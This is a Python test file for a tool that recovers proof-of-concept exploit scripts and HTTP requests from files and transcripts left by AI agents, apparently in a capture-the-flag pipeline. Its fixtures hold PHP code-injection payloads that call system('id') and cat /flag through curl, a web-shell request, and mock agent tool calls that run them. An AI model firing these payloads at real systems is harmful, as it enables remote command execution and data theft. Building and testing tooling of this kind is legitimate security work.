"""PoC recovery must work when no HTTP ToolCall carries Evidence.

Regression cover for "POC 导出还不修吗": a native Muteki Worker reports its whole
CLI turn as one opaque ``muteki_native_worker`` ToolCall, so
``muteki_poc_bundle._step_plan`` can never find an evidence-linked HTTP request
and the export answered 409 even though the Worker had written a working exploit
script into ``muteki/shared/`` and the transcripts held the real requests.

The fixtures deliberately mirror the real Run that exposed this: a
``poc_*.sh`` in ``muteki/shared``, plus codex- and claude-shaped transcripts
under ``muteki/evidence/cli-conversations``.
"""

from __future__ import annotations

import io
import json
import zipfile
from pathlib import Path

from app.services.muteki_poc_bundle import build_recovered_bundle
from app.services.muteki_poc_recovery import extract_http_requests, recover_poc

TARGET = "http://target.example"
FLAG = "CTF2{1aa54529-0abd-45f1-85f8-29cafcbea2ad}"


def _worker_script(root: Path) -> None:
    shared = root / "muteki" / "shared"
    shared.mkdir(parents=True, exist_ok=True)
    (shared / "poc_target_rce.sh").write_text(
        "#!/usr/bin/env bash\n"
        "TARGET=\"${TARGET:-http://target.example/}\"\n"
        "curl -s --get --data-urlencode \"cmd=' . system('id') . '\" \"$TARGET\"\n",
        encoding="utf-8",
    )


def _codex_transcript(root: Path) -> None:
    """codex shape: {"item": {"type": "command_execution", "command": ...}}."""

    directory = root / "muteki" / "evidence" / "cli-conversations"
    directory.mkdir(parents=True, exist_ok=True)
    lines = [
        json.dumps(
            {
                "type": "item.completed",
                "item": {
                    "id": "item_1",
                    "type": "command_execution",
                    # Nested in ``bash -lc "…"`` exactly like the real stream.
                    "command": (
                        '/bin/bash -lc "curl -s -i --max-time 20 '
                        f"{TARGET}/ | head -100\""
                    ),
                    "aggregated_output": "HTTP/1.1 200 OK",
                },
            }
        ),
        json.dumps(
            {
                "type": "item.completed",
                "item": {
                    "id": "item_2",
                    "type": "command_execution",
                    "command": (
                        'payload="\' . system(\'cat /flag\') . \'"; '
                        f'resp="$(curl -s --get --data-urlencode "cmd=$payload" {TARGET}/)"; '
                        f'curl -s {TARGET}/$fn'
                    ),
                    "aggregated_output": FLAG,
                },
            }
        ),
    ]
    (directory / "20260101T000000-001-codex-cli-abc-w.log").write_text(
        "\n".join(lines) + "\n", encoding="utf-8"
    )


def _claude_transcript(root: Path) -> None:
    """claude shape: {"message": {"content": [{"type": "tool_use", …}]}}."""

    directory = root / "muteki" / "evidence" / "cli-conversations"
    directory.mkdir(parents=True, exist_ok=True)
    record = {
        "type": "assistant",
        "message": {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "call_1",
                    "name": "Bash",
                    "input": {
                        "command": (
                            "curl -s "
                            f"\"{TARGET}/1c2bd40597842d6e679da0906772c22f.php?c=cat+/flag\""
                        )
                    },
                }
            ],
        },
    }
    (directory / "20260101T000001-001-claude-cli-def-.log").write_text(
        json.dumps(record) + "\n", encoding="utf-8"
    )


def test_worker_authored_script_is_recovered_verbatim(tmp_path) -> None:
    _worker_script(tmp_path)
    poc = recover_poc(tmp_path, target_url=TARGET)
    assert poc is not None
    assert poc.primary is not None
    assert poc.primary.filename == "poc_target_rce.sh"
    assert poc.primary.language == "bash"
    assert poc.primary.source_path == "muteki/shared/poc_target_rce.sh"
    # Verbatim: the payload survives byte-for-byte.
    assert "system('id')" in poc.primary.content


def test_both_transcript_shapes_yield_real_requests(tmp_path) -> None:
    _codex_transcript(tmp_path)
    _claude_transcript(tmp_path)
    requests, scanned = extract_http_requests(tmp_path)
    urls = [item["url"] for item in requests]
    # Both engines' commands are found, including the nested ``bash -lc`` one.
    assert f"{TARGET}/" in urls
    assert f"{TARGET}/1c2bd40597842d6e679da0906772c22f.php?c=cat+/flag" in urls
    assert scanned and scanned[0]["files"] == 2


def test_unresolved_shell_variables_are_flagged_not_guessed(tmp_path) -> None:
    _codex_transcript(tmp_path)
    poc = recover_poc(tmp_path, target_url=TARGET)
    assert poc is not None and poc.derived is not None
    # ``$fn`` was a live shell variable — it must be surfaced, never invented.
    assert any("$fn" in item for item in poc.derived.unresolved)


def test_derived_script_is_valid_python_and_marks_itself_unverified(tmp_path) -> None:
    import ast

    _claude_transcript(tmp_path)
    poc = recover_poc(tmp_path, target_url=TARGET, flag_pattern=r"CTF2\{[^}]+\}")
    assert poc is not None and poc.derived is not None
    script = poc.derived.content
    ast.parse(script)  # must be runnable
    assert "本管线未自动执行验证" in script
    assert "TARGET_URL" in script


def test_credentials_never_leave_inside_a_recovered_script(tmp_path) -> None:
    directory = tmp_path / "muteki" / "evidence" / "cli-conversations"
    directory.mkdir(parents=True)
    (directory / "t.log").write_text(
        json.dumps(
            {
                "item": {
                    "type": "command_execution",
                    "command": (
                        f'curl -s -H "Authorization: Bearer sk-supersecret123" {TARGET}/'
                    ),
                    "aggregated_output": "",
                }
            }
        )
        + "\n",
        encoding="utf-8",
    )
    poc = recover_poc(tmp_path, target_url=TARGET)
    assert poc is not None and poc.derived is not None
    assert "sk-supersecret123" not in poc.derived.content
    assert "{{secret_value}}" in poc.derived.content


def test_recovery_returns_none_when_nothing_exists(tmp_path) -> None:
    assert recover_poc(tmp_path) is None
    assert extract_http_requests(tmp_path) == ([], [])


def test_recovered_bundle_packages_both_sources_and_declares_unverified(tmp_path) -> None:
    _worker_script(tmp_path)
    _codex_transcript(tmp_path)
    poc = recover_poc(tmp_path, target_url=TARGET)
    assert poc is not None
    bundle = build_recovered_bundle(
        run_id="run-1", challenge_name="WriteSHell", recovered=poc, target_url=TARGET
    )
    assert bundle.request_plan == ()  # recovered bundle is not an HTTP plan
    with zipfile.ZipFile(io.BytesIO(bundle.content)) as archive:
        names = set(archive.namelist())
        assert "reproduce.py" in names
        assert "worker/poc_target_rce.sh" in names
        readme = archive.read("README.zh-CN.md").decode()
        manifest = json.loads(archive.read("recovery-manifest.json").decode())
    # The user's explicit requirement: never present a recovered PoC as verified.
    assert "本管线未自动执行验证" in readme
    assert manifest["verified_by_pipeline"] is False
    assert manifest["recovery"] == "worker_artifacts"
    assert manifest["primary"]["filename"] == "poc_target_rce.sh"
